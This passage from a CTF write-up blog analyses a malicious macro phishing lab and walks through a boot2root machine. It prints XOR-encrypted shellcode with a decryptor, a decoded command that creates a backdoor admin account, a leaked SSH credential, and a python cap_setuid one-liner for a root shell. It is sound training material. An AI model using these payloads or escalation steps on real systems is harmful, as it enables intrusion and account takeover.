<p>&ldquo;Please use the following template for the upcoming Project. The file will not work unless you open it using administrative privileges. When prompted, enable macros in order to get all of the details.&rdquo;</p></blockquote>
</li>
<li>
<p>Attachment:<code>Project_Template.docm</code>(a Word document with macros enabled).</p>
</li>
</ul>

<h3 class="relative group">Observations 
    <div id="observations" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#observations" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<ul>
<li>The email is suspicious because:
<ul>
<li>It urges the recipient to enable macros (a common malware delivery method).</li>
<li>It asks for administrative privileges (unusual for a simple document).</li>
</ul>
</li>
<li>The <code>.docm</code> extension confirms it contains macros.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat writing_template.eml 
</span></span><span class="line"><span class="cl">Content-Type: multipart/mixed<span class="p">;</span> <span class="nv">boundary</span><span class="o">=</span><span class="s2">&#34;===============7147510528207607842==&#34;</span>
</span></span><span class="line"><span class="cl">MIME-Version: 1.0
</span></span><span class="line"><span class="cl">From: he1pdesk@orcam.thm
</span></span><span class="line"><span class="cl">To: admin@orcam.thm
</span></span><span class="line"><span class="cl">Subject: Project Template
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">--<span class="o">===============</span><span class="nv">7147510528207607842</span><span class="o">==</span>
</span></span><span class="line"><span class="cl">Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span><span class="s2">&#34;us-ascii&#34;</span>
</span></span><span class="line"><span class="cl">MIME-Version: 1.0
</span></span><span class="line"><span class="cl">Content-Transfer-Encoding: 7bit
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Please use the following template <span class="k">for</span> the upcoming Project. The file will not work unless you open it using administrative privileges. When prompted, <span class="nb">enable</span> macros in order to get all of the details.
</span></span><span class="line"><span class="cl">--<span class="o">===============</span><span class="nv">7147510528207607842</span><span class="o">==</span>
</span></span><span class="line"><span class="cl">Content-Type: application/octet-stream
</span></span><span class="line"><span class="cl">MIME-Version: 1.0
</span></span><span class="line"><span class="cl">Content-Transfer-Encoding: base64
</span></span><span class="line"><span class="cl">Content-Disposition: attachment<span class="p">;</span> <span class="nv">filename</span><span class="o">=</span><span class="s2">&#34;Project_Template.docm&#34;</span>
</span></span><span class="line"><span class="cl">&lt;---------------------------SNIP-------------------------------&gt;
</span></span></code></pre></div><p>I extracted the email attachment by copying the base64 text from the <code>.eml</code>  file and decoding it into another file:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat artifact.txt <span class="p">|</span> base64 -d &gt; Project_Template.docm 
</span></span></code></pre></div>
<h3 class="relative group">Step 2: Extracting the Malicious Macro 
    <div id="step-2-extracting-the-malicious-macro" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-2-extracting-the-malicious-macro" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Since opening the file in LibreOffice gave macro errors, we need to manually inspect the VBA code.</p>

<h3 class="relative group">Key Findings in the Macro: 
    <div id="key-findings-in-the-macro" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#key-findings-in-the-macro" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>The document looked like this:</p>
<p>






<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="Opening_the_Attachment.png" src="/images/THM/Orcam/Opening_the_Attachment.png">

  
</figure>
</p>
<p>I then went ahead to open Macros:</p>
<p>






<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="Uncovered_Macros.png" src="/images/THM/Orcam/Uncovered_Macros.png">

  
</figure>
</p>

<h3 class="relative group">Step 3: Decrypting the Shellcode 
    <div id="step-3-decrypting-the-shellcode" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-3-decrypting-the-shellcode" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>The shellcode is hidden in the <code>buf</code> array, XOR-encrypted with <code>&quot;l33t&quot;</code>.</p>

<h3 class="relative group">Python Decryption Script: 
    <div id="python-decryption-script" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#python-decryption-script" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>I copied this Section of the code and tried to decode it using this python script:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">buf</span> <span class="o">=</span> <span class="o">[</span>144,219,177,116,108,51,83,253,137,2,243,16,231,99,3,255,62,63,184,38,120,184,65,92,99,132,121,82,93,204,159,72,13,79,49,88,76,242,252,121,109,244,209,134,62,100,184,38,124,184,121,72,231,127,34,12,143,123,50,165,61,184,106,84,109,224,184,61,116,208,9,61,231,7,184,117,186,2,204,216,173,252,62,117,171,11,211,1,154,48,78,140,87,78,23,1,136,107,184,44,72,50,224,18,231,63,120,255,52,47,50,167,231,55,184,117,188,186,119,80,72,104,104,21,53,105,98,139,140,108,108,46,231,33,216,249,49,89,50,249,233,129,51,116,108,99,91,69,231,92,180,139,185,136,211,105,70,57,91,210,249,142,174,139,185,15,53,8,102,179,200,148,25,54,136,51,127,65,92,30,108,96,204,161,2,86,71,84,25,64,86,6,76,82,87,25,5,93,90,7,24,65,65,21,24,92,65,84,58,118,91,58,9,3,101,70,33,100,75,18,56,102,113,48,15,89,113,77,76,28,82,16,8,19,28,45,76,21,19,26,9,71,19,24,3,80,82,24,11,65,92,1,28,19,82,16,1,90,93,29,31,71,65,21,24,92,65,7,76,82,87,25,5,93,90,7,24,65,65,21,24,92,65,84,67,82,87,16,108<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">key</span> <span class="o">=</span> <span class="s2">&#34;l33t&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">decrypted</span> <span class="o">=</span> <span class="o">[]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> i in range<span class="o">(</span>len<span class="o">(</span>buf<span class="o">))</span>:
</span></span><span class="line"><span class="cl">    decrypted.append<span class="o">(</span>buf<span class="o">[</span>i<span class="o">]</span> ^ ord<span class="o">(</span>key<span class="o">[</span>i % len<span class="o">(</span>key<span class="o">)]))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Convert to bytes</span>
</span></span><span class="line"><span class="cl"><span class="nv">shellcode</span> <span class="o">=</span> bytes<span class="o">(</span>decrypted<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Print as string to look for THM{...}</span>
</span></span><span class="line"><span class="cl">print<span class="o">(</span>shellcode.decode<span class="o">(</span><span class="s1">&#39;ascii&#39;</span>, <span class="nv">errors</span><span class="o">=</span><span class="s1">&#39;ignore&#39;</span><span class="o">))</span>
</span></span></code></pre></div><p>The key used above was found on the Macros.</p>

<h3 class="relative group">Output Analysis 
    <div id="output-analysis" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#output-analysis" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Running the script reveals:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ubuntu@tryhackme:~$ nano decrypt.py
</span></span><span class="line"><span class="cl">ubuntu@tryhackme:~$ python3 decrypt.py 
</span></span><span class="line"><span class="cl"><span class="sb">`</span>1dP0R
</span></span><span class="line"><span class="cl">8u<span class="o">}</span><span class="p">;</span><span class="o">}</span><span class="nv">$uXX$fI</span>:I41 
</span></span><span class="line"><span class="cl">           KXD$<span class="o">[[</span>aYZQ__Z<span class="o">]</span>jPh1o*
</span></span><span class="line"><span class="cl">h&lt;<span class="p">|</span>
</span></span><span class="line"><span class="cl">uGrojSnet user administrrator VEhNe0V2MWxfTUBDcjB9 /add /Y <span class="p">&amp;</span> net localgroup administrators administrrator /add
</span></span><span class="line"><span class="cl">ubuntu@tryhackme:~$ <span class="nb">echo</span> <span class="s2">&#34;VEhNe0V2MWxfTUBDcjB9&#34;</span> <span class="p">|</span> base64 -d
</span></span><span class="line"><span class="cl">ubuntu@tryhackme:~$ ls
</span></span><span class="line"><span class="cl">Desktop  Documents  Downloads  Music  Pictures  Project_Template.docm  Public  Templates  Videos  artifact.txt  decrypt.py  snap
</span></span><span class="line"><span class="cl">ubuntu@tryhackme:~$ <span class="nb">echo</span> <span class="s2">&#34;VEhNe0V2MWxfTUBDcjB9&#34;</span> <span class="p">|</span> base64 -d              
</span></span><span class="line"><span class="cl">THM<span class="o">{</span>Ev1l_M@Cr0<span class="o">}</span>ubuntu@tryhackme:~$    
</span></span></code></pre></div>
<h3 class="relative group">Summary of the Investigation 
    <div id="summary-of-the-investigation" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#summary-of-the-investigation" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<ol>
<li><strong>Delivery Method:</strong> Phishing email with a malicious Word attachment.</li>
<li><strong>Execution Trigger:</strong> Auto-executing macro (<strong><code>Document_Open()</code></strong> and <strong><code>AutoOpen()</code></strong>).</li>
<li><strong>Payload:</strong> XOR-encrypted shellcode (key: <strong><code>&quot;l33t&quot;</code></strong>).</li>
<li><strong>Malicious Actions:</strong>
<ul>
<li>Creates a backdoor admin user (<strong><code>administrrator</code></strong>).</li>
<li>Contains the flag in base64 (<strong><code>VEhNe0V2MWxfTUBDcjB9</code></strong> → <strong><code>THM{Ev1l_M@Cr0}</code></strong>).</li>
</ul>
</li>
</ol>

<h2 class="relative group">Chess Industry 
    <div id="chess-industry" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#chess-industry" aria-label="Anchor">#</a>
    </span>        
    
</h2>

<h3 class="relative group">Description 
    <div id="description-5" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#description-5" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<blockquote>
<p>This was a Boot2Root challenge, I forgot to copy its description but will update it here as soon as I stumble upon it!</p></blockquote>

<h3 class="relative group">Step 1: Reconnaissance (Port Scanning) 
    <div id="step-1-reconnaissance-port-scanning" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-1-reconnaissance-port-scanning" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>We start by scanning the target machine (<strong><code>10.10.94.121</code></strong>) to identify open ports and services.</p>

<h3 class="relative group">Nmap Scan 
    <div id="nmap-scan" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#nmap-scan" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@ip-10-10-187-39:~# nmap -sCV -T4 -p- 10.10.94.121
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-06-28 14:19 BST
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> ip-10-10-94-121.eu-west-1.compute.internal <span class="o">(</span>10.10.94.121<span class="o">)</span>
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.00015s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65532</span> closed ports
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl">79/tcp open  finger  Linux fingerd
</span></span><span class="line"><span class="cl"><span class="p">|</span>_finger: No one logged on.<span class="se">\x</span>0D
</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.52 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.52 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: PrecisionChess IoT - Smart Chessboard Control
</span></span><span class="line"><span class="cl">MAC Address: 02:61:72:C9:A6:09 <span class="o">(</span>Unknown<span class="o">)</span>
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 20.04 seconds
</span></span><span class="line"><span class="cl">root@ip-10-10-187-39:~# 
</span></span></code></pre></div><p><strong>Findings:</strong></p>
<ul>
<li><strong>Port 22 (SSH)</strong> - OpenSSH 8.9p1 (Ubuntu)</li>
<li><strong>Port 79 (finger)</strong> - Linux <strong><code>fingerd</code></strong> service</li>
<li><strong>Port 80 (HTTP)</strong> - Apache 2.4.52 (Ubuntu)
<ul>
<li>Website: <strong>PrecisionChess IoT - Smart Chessboard Control</strong></li>
</ul>
</li>
</ul>

<h3 class="relative group">Step 2: Web Enumeration 
    <div id="step-2-web-enumeration" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-2-web-enumeration" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Visiting <strong><code>http://10.10.94.121</code></strong> reveals a chess-themed IoT control panel.</p>

<h3 class="relative group">Key Observations 
    <div id="key-observations" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#key-observations" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<ul>
<li><strong>Under Construction</strong> banner (possible incomplete security)</li>
<li><strong>Team Members</strong> (potential usernames: <strong><code>magnus</code></strong>, <strong><code>fabiano</code></strong>, <strong><code>hikaru</code></strong>)</li>
<li><strong>Chessboard Status</strong> (Board-001 to Board-004, one offline)</li>
</ul>
<p>






<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="Webpage.png" src="/images/THM/Chess_Industry/Webpage.png">

  
</figure>
</p>

<h3 class="relative group">Step 3: Exploiting the Finger Service (Port 79) 
    <div id="step-3-exploiting-the-finger-service-port-79" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-3-exploiting-the-finger-service-port-79" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>The <strong>finger service</strong> (<strong><code>fingerd</code></strong>) is an old but fascinating protocol that reveals information about users on a system. It was commonly used in early UNIX systems (1970s-1990s) but is rarely seen today due to security risks.</p>
<hr>

<h3 class="relative group">What is the Finger Protocol? 
    <div id="what-is-the-finger-protocol" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#what-is-the-finger-protocol" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<ul>
<li><strong>Purpose</strong>: Provides user information (login name, real name, terminal, idle time, etc.).</li>
<li><strong>Port</strong>: <strong>TCP/79</strong></li>
</ul>
<p>The <strong><code>finger</code></strong> service can reveal user information.</p>

<h3 class="relative group">Why Was It Dangerous? 
    <div id="why-was-it-dangerous" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#why-was-it-dangerous" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<ol>
<li><strong>Information Leakage</strong>
<ul>
<li>Reveals usernames, login times, and even <strong><code>.plan</code></strong>/<strong><code>.project</code></strong> files.</li>
<li>Example: In this CTF, <strong><code>finger fabiano@10.10.94.121</code></strong> exposed a <strong>base64 password</strong> in <strong><code>.plan</code></strong>.</li>
</ul>
</li>
<li><strong>User Enumeration</strong>
<ul>
<li>Attackers could list valid usernames (<strong><code>finger @target</code></strong>).</li>
</ul>
</li>
<li><strong>Historical Exploits</strong>
<ul>
<li>Some versions had buffer overflows (e.g., <strong>&ldquo;fingerd&rdquo; exploit in 1988 Morris Worm</strong>).</li>
</ul>
</li>
</ol>

<h3 class="relative group">Enumerate Users 
    <div id="enumerate-users" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#enumerate-users" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">finger @10.10.94.121
</span></span><span class="line"><span class="cl">finger fabiano@10.10.94.121
</span></span><span class="line"><span class="cl">finger hikaru@10.10.94.121
</span></span><span class="line"><span class="cl">finger magnus@10.10.94.121
</span></span></code></pre></div><p>We discover something interesting under Fabiano:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@ip-10-10-187-39:~# finger fabiano@10.10.94.121
</span></span><span class="line"><span class="cl">Login: fabiano        			Name: 
</span></span><span class="line"><span class="cl">Directory: /home/fabiano            	Shell: /bin/bash
</span></span><span class="line"><span class="cl">Never logged in.
</span></span><span class="line"><span class="cl">No mail.
</span></span><span class="line"><span class="cl">Project:
</span></span><span class="line"><span class="cl">Reminders
</span></span><span class="line"><span class="cl">Plan:
</span></span><span class="line"><span class="cl"><span class="nv">ZmFiaWFubzpvM2pWVGt0YXJHUUkwN3E</span><span class="o">=</span>
</span></span></code></pre></div><p>I tried decoding this string:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@ip-10-10-187-39:~# <span class="nb">echo</span> <span class="s2">&#34;ZmFiaWFubzpvM2pWVGt0YXJHUUkwN3E=&#34;</span> <span class="p">|</span> base64 -d
</span></span><span class="line"><span class="cl">fabiano:o3jVTktarGQI07qroot@ip-10-10-187-39:~# 
</span></span></code></pre></div><p>This decodes to something that looks like credentials for SSH.</p>

<h3 class="relative group">Step 4: Initial Foothold via SSH 
    <div id="step-4-initial-foothold-via-ssh" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-4-initial-foothold-via-ssh" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Using the discovered credentials:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@ip-10-10-187-39:~# ssh fabiano@10.10.94.121
</span></span><span class="line"><span class="cl">The authenticity of host <span class="s1">&#39;10.10.94.121 (10.10.94.121)&#39;</span> can<span class="s1">&#39;t be established.
</span></span></span><span class="line"><span class="cl"><span class="s1">ECDSA key fingerprint is SHA256:Dbhug683PbcwejGvtf6fe3Jk0Zg/5UheCErOHI6rbow.
</span></span></span><span class="line"><span class="cl"><span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span></span><span class="line"><span class="cl"><span class="s1">Warning: Permanently added &#39;</span>10.10.94.121<span class="s1">&#39; (ECDSA) to the list of known hosts.
</span></span></span><span class="line"><span class="cl"><span class="s1">fabiano@10.10.94.121&#39;</span>s password: 
</span></span><span class="line"><span class="cl">Welcome to Ubuntu 22.04.5 LTS <span class="o">(</span>GNU/Linux 6.8.0-1030-aws x86_64<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> * Documentation:  https://help.ubuntu.com
</span></span><span class="line"><span class="cl"> * Management:     https://landscape.canonical.com
</span></span><span class="line"><span class="cl"> * Support:        https://ubuntu.com/pro
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> System information as of Sat Jun <span class="m">28</span> 13:31:23 UTC <span class="m">2025</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  System load:  0.19               Processes:             <span class="m">108</span>
</span></span><span class="line"><span class="cl">  Usage of /:   17.8% of 19.31GB   Users logged in:       <span class="m">0</span>
</span></span><span class="line"><span class="cl">  Memory usage: 44%                IPv4 address <span class="k">for</span> ens5: 10.10.94.121
</span></span><span class="line"><span class="cl">  Swap usage:   0%
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> * Ubuntu Pro delivers the most comprehensive open <span class="nb">source</span> security and
</span></span><span class="line"><span class="cl">   compliance features.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   https://ubuntu.com/aws/pro
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Expanded Security Maintenance <span class="k">for</span> Applications is not enabled.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="m">1</span> update can be applied immediately.
</span></span><span class="line"><span class="cl"><span class="m">1</span> of these updates is a standard security update.
</span></span><span class="line"><span class="cl">To see these additional updates run: apt list --upgradable
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Enable ESM Apps to receive additional future security updates.
</span></span><span class="line"><span class="cl">See https://ubuntu.com/esm or run: sudo pro status
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">The programs included with the Ubuntu system are free software<span class="p">;</span>
</span></span><span class="line"><span class="cl">the exact distribution terms <span class="k">for</span> each program are described in the
</span></span><span class="line"><span class="cl">individual files in /usr/share/doc/*/copyright.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
</span></span><span class="line"><span class="cl">applicable law.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">fabiano@tryhackme-2204:~$ ls
</span></span><span class="line"><span class="cl">user.txt
</span></span><span class="line"><span class="cl">fabiano@tryhackme-2204:~$ cat user.txt
</span></span><span class="line"><span class="cl">THM<span class="o">{</span>bishop_to_c4_check<span class="o">}</span>
</span></span></code></pre></div><p>That gives us a foothold on to the target and we secure our first flag for this challenge.</p>

<h3 class="relative group">Step 5: Privilege escalation 
    <div id="step-5-privilege-escalation" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-5-privilege-escalation" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>From here, I downloaded the <code>linpeas.sh</code> script to my attacker machine and sent it to the vulnerable target using a python web server. I then uncovered something when I ran the script:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;-----------------------SNIP----------------------&gt;
</span></span><span class="line"><span class="cl">Files with capabilities <span class="o">(</span>limited to 50<span class="o">)</span>:
</span></span><span class="line"><span class="cl">/snap/core20/2434/usr/bin/ping <span class="nv">cap_net_raw</span><span class="o">=</span>ep
</span></span><span class="line"><span class="cl">/snap/core22/1621/usr/bin/ping <span class="nv">cap_net_raw</span><span class="o">=</span>ep
</span></span><span class="line"><span class="cl">/snap/core22/2010/usr/bin/ping <span class="nv">cap_net_raw</span><span class="o">=</span>ep
</span></span><span class="line"><span class="cl">/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin<span class="o">=</span>ep
</span></span><span class="line"><span class="cl">/usr/bin/python3.10 <span class="nv">cap_setuid</span><span class="o">=</span>ep
</span></span><span class="line"><span class="cl">/usr/bin/mtr-packet <span class="nv">cap_net_raw</span><span class="o">=</span>ep
</span></span><span class="line"><span class="cl">/usr/bin/ping <span class="nv">cap_net_raw</span><span class="o">=</span>ep
</span></span><span class="line"><span class="cl">&lt;-----------------------SNIP----------------------&gt;
</span></span></code></pre></div><p><strong><code>cap_setuid</code></strong> allows Python to <strong>set UID to root</strong>! Therefore, we can exploit it to get a root shell.</p>
<p><strong>Exploiting Python Capabilities</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">fabiano@tryhackme-2204:/tmp$ /usr/bin/python3.10 -c <span class="s1">&#39;import os; os.setuid(0); os.system(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl">root@tryhackme-2204:/tmp# <span class="nb">pwd</span>
</span></span><span class="line"><span class="cl">/tmp
</span></span><span class="line"><span class="cl">root@tryhackme-2204:/tmp# ls /root
</span></span><span class="line"><span class="cl">root.txt  snap
</span></span><span class="line"><span class="cl">root@tryhackme-2204:/tmp# cat /root/root.txt 
</span></span><span class="line"><span class="cl">THM<span class="o">{</span>check_check_check_mate<span class="o">}</span>
</span></span><span class="line"><span class="cl">root@tryhackme-2204:/tmp# 
</span></span></code></pre></div>
<h3 class="relative group">Attack Path Summary 
    <div id="attack-path-summary" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#attack-path-summary" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<ol>
<li><strong>Port Scan</strong> → Found <strong><code>finger</code></strong> (port 79) and HTTP (port 80).</li>
<li><strong>Finger Enumeration</strong> → Leaked <strong><code>fabiano</code></strong>&rsquo;s password via <strong><code>.plan</code></strong>.</li>
<li><strong>SSH Login</strong> → Gained initial shell.</li>
<li><strong>Capabilities Abuse</strong> → Used <strong><code>python3.10</code></strong>&rsquo;s <strong><code>cap_setuid</code></strong> to escalate to root.</li>
</ol>

<h2 class="relative group">Under Construction 
    <div id="under-construction" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#under-construction" aria-label="Anchor">#</a>
    </span>        
    
</h2>

<h3 class="relative group">Description 
    <div id="description-6" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#description-6" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<blockquote>
<p>ZeroTrace wastes no time: one misstep in the plant&rsquo;s login routine, and she&rsquo;s in. Credentials, shells, root, factory systems fall in quick succession.</p></blockquote>
<p><strong>Target IP:</strong> <strong><code>10.10.27.251</code></strong></p>

<h3 class="relative group">Step 1: Reconnaissance (Port Scanning with Nmap) 
    <div id="step-1-reconnaissance-port-scanning-with-nmap" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-1-reconnaissance-port-scanning-with-nmap" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>First, I scanned the target machine to identify open ports and services:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@ip-10-10-46-202:~# nmap -sCV -p- -T4 10.10.191.157
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-06-29 11:30 BST
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> ip-10-10-191-157.eu-west-1.compute.internal <span class="o">(</span>10.10.191.157<span class="o">)</span>
